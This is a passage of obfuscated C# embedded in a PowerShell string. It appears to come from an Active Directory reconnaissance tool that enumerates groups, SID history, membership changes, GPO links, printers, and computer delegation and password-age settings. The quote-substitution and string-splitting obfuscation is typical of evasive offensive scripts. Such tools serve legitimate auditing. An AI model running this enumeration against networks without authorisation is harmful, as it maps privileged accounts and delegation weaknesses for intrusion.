                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties[I2ajgrouptypeI2aj][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? I2ajSecurityI2aj : I2ajDistributionI2aj;

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = I2ajUniversalI2aj;
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = I2ajGlobalI2aj;
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = I2ajDomainLocalI2aj;
                        }
                    }
                    if (AdGroup.Properties[I2ajsidhistoryI2aj].Count >= 1)
                    {
                        string sids = I2ajI2aj;
                        for (int i = 0; i < AdGroup.Properties[I2ajsidhistoryI2aj].Count; i++)
                        {
                            var history = AdGroup.Properties[I2ajsidhistoryI2aj][i];
                            sids = sids + I2aj,I2aj + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(JQTOy,JQTOy);
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdGroup.Properties[I2ajsamaccountnameI2aj][0]));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajAdminCountI2aj, (AdGroup.Properties[I2ajadmincountI2aj].Count != 0 ? AdGroup.Properties[I2ajadmincountI2aj][0] : I2ajI2aj)));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajGroupCategoryI2aj, GroupCategory));
                '+'    GroupObj.Members.Add(new PSNoteProperty(I2ajGroupScopeI2aj, GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajManagedByI2aj, ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajSIDI2aj, Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties[I2ajobjectSIDI2aj][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajSIDHistoryI2aj, SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, (AdGroup.Properties[I2ajDescriptionI2aj].Count != 0 ? CleanString(AdGroup.Properties[I2ajDescriptionI2aj][0]) : I2ajI2aj)));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdGroup.Properties[I2ajwhencreatedI2aj][0]));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdGroup.Properties[I2ajwhenchangedI2aj][0]));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, CleanString(AdGroup.Properties[I2ajdistinguishednameI2aj][0])));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajCanonicalNameI2aj, AdGroup.Properties[I2ajcanonicalnameI2aj][0]));
                    return new PSObject[] { GroupO'+'bj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    System.DirectoryServices.ResultPropertyValueCollection ReplValueMetaData = (System.DirectoryServices.ResultPropertyValueCollection) AdGroup.Properties[I2ajmsDS-ReplValueMetaDataI2aj];

                    if (ReplValueMetaData.Count != 0)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace(I2ajCOlhgx00I2aj, I2ajI2aj).Replace(I2aj&I2aj,I2aj&amp;I2aj));

                            if (ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeDeletedI2aj].InnerText != I2aj1601-01-01T00:00:00ZI2aj)
                            {
                                Action = I2ajRemovedI2aj;
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeCreatedI2aj].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = Date'+'Time.Parse(ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeDeletedI2aj].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = I2ajAddedI2aj;
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeCreatedI2aj].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                '+'            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, AdGroup.Properties[I2ajsamaccountnameI2aj][0]));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajGroup DistinguishedNameI2aj, CleanString(AdGroup.Properties[I2ajdistinguishednameI2aj][0])));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajMember DistinguishedNameI2aj, CleanString(ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajpszObjectDnI2aj].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajActionI2aj, Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajAdded Age (Days)I2aj, DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajRemoved Age (Days)I2aj, DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajAdded DateI2aj, AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajRemoved DateI2aj, RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajftimeCreatedI2aj, ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeCreatedI2aj].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajftimeDeletedI2aj, ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeDeletedI2aj].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties[I2ajobjectSIDI2aj][0], 0))),(Convert.ToString(AdGroup.Properties[I2ajsamaccountnameI2aj][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties[I2ajsamaccounttypeI2aj].Count != 0 ? Convert.ToString(AdGroup.Properties[I2ajsamaccounttypeI2aj][0]) : I2ajI2aj;
                    string ObjectClass = Convert.ToString(AdGroup.Properties[I2ajobjectclassI2aj][AdGroup.Properties[I2ajobjectclassI2aj].Count-1]);
                    string AccountType = I2ajI2aj;
                    string GroupName = I2ajI2aj;
                    string MemberUserName = I2aj-I2aj;
                    string MemberName = I2ajI2aj;
                    string PrimaryGroupID = I2ajI2aj;
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == I2ajforeignSecurityPrincipalI2aj)
                    {
                        AccountType = I2ajforeignSecurityPrincipalI2aj;
                        MemberName = null;
                        MemberUserName = ((Convert.ToString(AdGroup.Properties[I2ajDistinguishedNameI2aj][0])).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        foreach (string GroupMember in AdGroup.Properties[I2ajmemberofI2aj])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = I2ajgroupI2aj;
                        MemberName = ((Convert.ToString(AdGroup.Properties[I2ajDistinguishedNameI2aj][0])).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        foreach (string GroupMember in AdGroup.Properties[I2ajmemberofI2aj])
                        {
                            GroupName = ((C'+'onvert.ToString(GroupMember)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = I2ajuserI2aj;
                        MemberName = ((Convert.ToString(AdGroup.Properties[I2ajDistinguishedNameI2aj][0])).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties[I2ajsAMAccountNameI2aj][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties[I2ajprimaryGroupIDI2aj][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + I2aj-I2aj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties[I2ajmemberofI2aj])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = I2ajcomputerI2aj;
                        MemberName = ((Convert.ToString(AdGroup.Properties[I2ajDistinguishedNameI2aj][0])).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties[I2ajsAMAccountNameI2aj][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties[I2ajprimaryGroupIDI2aj][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + I2aj-I2aj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties[I2ajmemberofI2aj])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = I2ajtrustI2aj;
                        MemberName = ((Convert.ToString(AdGroup.Properties[I2ajDistinguishedNameI2aj][0])).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties[I2ajsAMAccountNameI2aj][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties[I2ajprimaryGroupIDI2aj][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + I2aj-I2aj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObjec'+'t();
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                        GroupMemberObj.Members.Add(new PS'+'NoteProperty(I2ajMember NameI2aj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
          '+'      }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdOU.Properties[I2ajnameI2aj][0]));
                    OUObj.Members.Add(new PSNoteProperty(I2ajDepthI2aj, ((Convert.ToString(AdOU.Properties[I2ajdistinguishednameI2aj][0]).Split(new string[] { I2ajOU=I2aj }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, (AdOU.Properties[I2'+'ajdescriptionI2aj].Count != 0 ? AdOU.Properties[I2ajdescriptionI2aj][0] : I2ajI2aj)));
                    OUObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdOU.Properties[I2'+'ajwhencreatedI2aj][0]));
                    OUObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdOU.Properties[I2ajwhenchangedI2aj][0]));
                    OUObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdOU.Properties[I2ajdistinguishednameI2aj][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
 '+'                   Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty(I2ajDisplayNameI2aj, CleanString(AdGPO.Properties[I2ajdisplaynameI2aj][0])));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajGUIDI2aj, CleanString(AdGPO.Properties[I2ajnameI2aj][0])));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdGPO.Properties[I2ajwhenCreatedI2aj][0]));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdGPO.Properties[I2ajwhenChangedI2aj][0]));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, CleanString(AdGPO.Properties[I2ajdistinguishednameI2aj][0])));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajFilePathI2aj, AdGPO.Properties[I2ajgpcfilesyspathI2aj][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSOb'+'ject[] { };
                }
            }
        }

      '+'  class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties[I2ajdistinguishednameI2aj][0]).ToUpper()), (Convert.ToString(AdGPO.Properties[I2ajdisplaynameI2aj][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = (AdSOM.Properties[I2ajgPLinkI2aj].Count != 0 ? Convert.ToString(AdSOM.Properties[I2ajgPLinkI2aj][0]) : I2ajI2aj);
                    string GPOName = null;

                    Depth = ((Convert.ToString(AdSOM.Properties[I2ajdistinguishednameI2aj][0]).Split(new string[] { I2ajOU=I2aj }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties[I2ajgPOptionsI2aj].Count != 0)
                    {
                        if ((int) AdSOM.Properties[I2ajgPOptionsI2aj][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(JQTOy]JQTOy, JQTOy[JQTOy).Where(x => x.StartsWith(I2ajLDAPI2aj));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdSOM.Properties[I2ajnameI2aj][0]));
                        SOMObj.Members.Add(new'+' PSNoteProperty(I2ajDepthI2aj, Depth));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdSOM.Properties[I2ajdistinguishednameI2aj][0]));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajLink OrderI2aj, null));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajGPOI2aj, GPOName));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajEnforcedI2aj, Enforced));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajLink EnabledI2aj, LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajBlockInheritanceI2aj, BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajgPLinkI2aj, gPLink));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajgPOptionsI2aj, (AdSOM.Properties[I2ajgpoptionsI2aj].Count != 0 ? AdSOM.Properties[I2ajgpoptionsI2aj][0] : I2ajI2aj)));
                        SOMsList.Add( SOMObj );
                    }
               '+'     foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split(JQTOy/JQTOy, JQTOy;JQTOy);
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split(JQTOy=JQTOy,JQTOy,JQTOy)[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdSOM.Properties[I2ajnameI2aj][0]));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajDepthI2aj, Depth));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdSOM.Properties[I2ajdistinguishednameI2aj][0]));
                '+'        SOMObj.Members.Add(new PSNoteProperty(I2ajLink OrderI2aj, Order));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajGPOI2aj, GPOName));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajEnforcedI2aj, Enforced));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajLink EnabledI2aj, LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajBlockInheritanceI2aj, BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajgPLinkI2aj, gPLink));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajgPOptionsI2aj, (AdSOM.Properties[I2ajgpoptionsI2aj].Count != 0 ? AdSOM.Properties[I2ajgpoptionsI2aj][0] : I2ajI2aj)));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
              '+'  try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdPrinter.Properties[I2ajNameI2aj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajServerNameI2aj, AdPrinter.Properties[I2ajserverNameI2aj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajShareNameI2aj, AdPrinter.Properties[I2ajprintShareNameI2aj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajDriverNameI2aj, AdPrinter.Properties[I2ajdriverNameI2aj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajDriverVersionI2aj, AdPrinter.Properties[I2ajdriverVersionI2aj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(I2'+'ajPortNameI2aj, AdPrinter.Properties[I2ajportNameI2aj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajURLI2aj, AdPrinter.Properties[I2ajurlI2aj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdPrinter.Properties[I2ajwhenCreatedI2aj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdPrinter.Properties[I2ajwhenChangedI2aj][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge'+' = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    string StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties[I2ajdnshostnameI2aj].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties[I2ajdnshostnameI2aj][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties[I2ajuseraccountcontrolI2aj].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties[I2ajuseraccountcontrolI2aj][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                    }
                    if (AdComputer.Properties[I2ajlastlogontimestampI2aj].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties[I2ajlastlogontimestampI2aj][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties[I2ajpwdlastsetI2aj].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties[I2ajpwdlastsetI2aj][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties[I2ajprimarygroupidI2aj][0] == 515) )
                    {
                        DelegationType = I2ajUnconstrainedI2aj;
                        DelegationServices = I2ajAnyI2aj;
                    }
                    if (AdComputer.Properties[I2ajmsDS-AllowedToDelegateToI2aj].Count >= 1)
                    {
                        DelegationType = I2ajConstrainedI2aj;
                        for (int i = 0; i < AdComputer.Properties[I2ajmsDS-AllowedToDelegateToI2aj].Count; i++)
                        {
                            var delegateto = AdComputer.Properties[I2ajmsDS-AllowedToDelegateToI2aj][i];
                            DelegationServices = DelegationServices + I2aj,I2aj + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(JQTOy,JQTOy);
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = I2ajAnyI2aj;
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = I2ajKerberosI2aj;
                    }
                    string SIDHistory = I2ajI2aj;
                    if (AdComputer.Properties[I2ajsidhistoryI2aj].Count >= 1)
                    {
                        string sids = I2ajI2aj;
                        for (int i = 0; i < AdComputer.Properties[I2ajsidhistoryI2aj].Count; i++)
                        {
                            var history = AdComputer.Properties[I2ajsidhistoryI2aj][i];
                            sids = sids + I2aj,I2aj + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(JQTOy,JQTOy);
                    }
                    string OperatingSystem = CleanString((AdComputer.Properties[I2ajoperatingsystemI2aj].Count != 0 ? AdComputer.Properties[I2ajoperatingsystemI2aj][0] : I2aj-I2aj) + I2aj I2aj + (AdComputer.Properties[I2ajoperatingsystemhotfixI2aj].Count != 0 ? AdComputer.Properties[I2ajoperatingsystemhotfixI2aj][0] : I2aj I2aj) + I2aj I2aj + (AdComputer.Properties[I2ajoperatingsystemservicepackI2aj].Count != 0 ? AdComputer.Properties[I2ajoperatingsystemservicepackI2aj][0] : I2aj I2aj) + I2aj I2aj + (AdComputer.Properties[I2ajoperatingsystemversionI2aj].Count != 0 ? AdComputer.Properties[I2ajoperatingsystemversionI2aj][0] : I2aj I2aj));

                    PSObject ComputerObj = new PSObject();
          '+'          ComputerObj.Members.Add(new PSNoteProperty(I2ajUserNameI2aj, (AdComputer.Properties[I2ajsamaccountnameI2aj].Count != 0 ? CleanString(AdComputer.Properties[I2ajsamaccountnameI2aj][0]) : I2ajI2aj)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, (AdComputer.Properties[I2ajnameI2aj].Count != 0 ? CleanString(AdComputer.Properties[I2ajnameI2aj][0]) : I2ajI2aj)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajDNSHostNameI2aj, (AdComputer.Properties[I2ajdnshostnameI2aj].Count != 0 ? AdComputer.Properties[I2ajdnshostnameI2aj][0] : I2ajI2aj)));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajEnabledI2aj, Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty(I2ajIPv4AddressI2aj, StrIPAddress));
